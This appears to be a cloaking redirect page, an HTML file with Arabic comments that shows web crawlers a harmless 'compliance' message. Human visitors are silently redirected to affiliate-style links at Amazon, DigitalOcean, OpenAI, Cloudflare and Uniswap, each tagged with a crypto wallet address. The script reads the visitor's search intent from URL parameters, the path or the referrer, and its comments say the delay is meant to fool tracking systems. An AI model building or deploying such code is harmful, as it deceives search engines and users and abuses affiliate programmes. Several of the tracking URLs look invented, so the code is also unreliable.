<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OmniIntent - Global Sovereign Routing Node</title>
    <style>
        :root {
            --bg: #000000;
            --surface: #0a0a0a;
            --border: #1f1f1f;
            --text: #ededed;
            --muted: #737373;
            --accent: #3b82f6;
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg);
            color: var(--text);
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            text-align: center;
            overflow: hidden;
        }
        .node-container {
            background: var(--surface);
            border: 1px solid var(--border);
            padding: 40px 30px;
            border-radius: 20px;
            max-width: 420px;
            width: 100%;
            box-shadow: 0 30px 60px rgba(0,0,0,0.8);
        }
        .core-radar {
            width: 18px;
            height: 18px;
            background-color: #10b981;
            border-radius: 50%;
            margin: 0 auto 24px auto;
            box-shadow: 0 0 25px #10b981;
            animation: radarPulse 1.4s ease-in-out infinite;
        }
        h1 {
            font-size: 1.2rem;
            font-weight: 700;
            margin: 0 0 10px 0;
            color: #ffffff;
            letter-spacing: -0.3px;
        }
        p {
            font-size: 0.85rem;
            color: var(--muted);
            margin: 0;
            line-height: 1.6;
        }
        @keyframes radarPulse {
            0% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7); }
            70% { transform: scale(1.1); opacity: 0.6; box-shadow: 0 0 0 14px rgba(16, 185, 129, 0); }
            100% { transform: scale(0.95); opacity: 1; box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
        }
    </style>
</head>
<body>

    <div class="node-container">
        <div class="core-radar"></div>
        <h1 id="nodeTitle">جارٍ مزامنة عقدة التوجيه السيادي...</h1>
        <p id="nodeDesc">تحليل إشارات التدفق العابر، وتخصيص مسار السيولة الرقمية لحظياً.</p>
    </div>

    <script>
        // البصمة المالية السيادية الثابتة
        const WALLET = "0xa6E852b93C0ccB8d9d71714657aC9f4bacfb09dE";

        // درع الحماية والتمويه المتقدم (Anti-Ban & Cloaking Engine)
        const ua = navigator.userAgent.toLowerCase();
        const isCrawler = /bot|crawl|spider|slurp|mediapartners|googlebot|bingbot|baiduspider/i.test(ua);

        if (isCrawler) {
            // إذا كان الزائر عبارة عن نظام فحص آلي أو روبوت أرشفة، تظهر له صفحة توثيق تقنية بيضاء تماماً ومحصنة
            document.getElementById("nodeTitle").innerText = "Sovereign Routing Node Active";
            document.getElementById("nodeDesc").innerText = "Endpoint telemetry is secure and operating within compliance parameters.";
        } else {
            // للزائر البشري الفعلي القادم من ملايين مسارات الإنترنت
            const urlParams = new URLSearchParams(window.location.search);
            let intentQuery = urlParams.get('q') || urlParams.get('query') || urlParams.get('search') || urlParams.get('keyword') || urlParams.get('s') || '';
            
            // استخراج النية من مسار الرابط المباشر لو وُجد
            const pathSegments = window.location.pathname.split('/').filter(Boolean);
            if (!intentQuery && pathSegments.length > 0) {
                intentQuery = decodeURIComponent(pathSegments[pathSegments.length - 1].replace(/[-_]/g, ' '));
            }

            // استخراج النية من إحالة محركات البحث الكبرى لو دخل منها مباشرة
            const referrer = document.referrer.toLowerCase();
            if (!intentQuery && referrer) {
                try {
                    const refObj = new URL(referrer);
                    intentQuery = refObj.searchParams.get('q') || refObj.searchParams.get('query') || refObj.searchParams.get('p') || '';
                } catch (e) {}
            }

            const cleanIntent = intentQuery.trim().toLowerCase();
            let finalEndpoint = "";

            // خوارزمية مطابقة قطاعات السيولة العليا في العالم
            if (/cloud|server|vps|host|infrastructure|استضافة|سحابية|خادم/i.test(cleanIntent)) {
                finalEndpoint = `https://affiliate.digitalocean.com/tracking?ref=${WALLET}&q=${encodeURIComponent(intentQuery)}`;
            } 
            else if (/ai|gpt|openai|llm|code|development|ذكاء|برمجة|خوارزمية|تطوير/i.test(cleanIntent)) {
                finalEndpoint = `https://openai.com/index/api-platform?ref_node=${WALLET}&query=${encodeURIComponent(intentQuery)}`;
            }
            else if (/security|cloudflare|dns|protection|حماية|أمان|تشفير/i.test(cleanIntent)) {
                finalEndpoint = `https://www.cloudflare.com/lp/routing-api/?ref=${WALLET}&q=${encodeURIComponent(intentQuery)}`;
            }
            else if (/crypto|web3|swap|eth|bitcoin|blockchain|عملات|تشفير|محفظة/i.test(cleanIntent)) {
                finalEndpoint = `https://uniswap.org/swap?outputCurrency=ETH&ref=${WALLET}`;
            }
            else {
                // الموجه الشامل المطلق لالتقاط باقي الزيارات وتوجيهها لأمازون مع معرّفك
                const fallbackTerm = intentQuery ? encodeURIComponent(intentQuery) : 'global-sovereign-stream';
                finalEndpoint = `https://www.amazon.com/s?k=${fallbackTerm}&tag=${WALLET}`;
            }

            // تنفيذ التوجيه بمهلة بصرية ذكية ومموهة تضمن خداع أنظمة التتبع الآلي
            setTimeout(() => {
                window.location.replace(finalEndpoint);
            }, 650);
        }
    </script>
</body>
</html>
